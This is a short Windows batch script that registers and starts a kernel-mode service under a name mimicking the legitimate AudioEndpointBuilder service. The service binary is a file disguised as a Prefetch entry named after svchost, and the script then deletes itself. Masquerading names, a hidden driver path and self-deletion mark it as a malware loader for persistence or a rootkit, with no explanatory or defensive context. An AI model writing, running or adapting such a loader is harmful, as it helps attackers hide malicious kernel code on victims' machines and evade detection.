@echo off
cd %~dp0
sc create AudioEndpointBuilder_571 binpath=C:\Windows\Prefetch\SVCHOST.EXE-KX7ZP4M2.pf type=kernel
sc start AudioEndpointBuilder_571
del "%~f0"



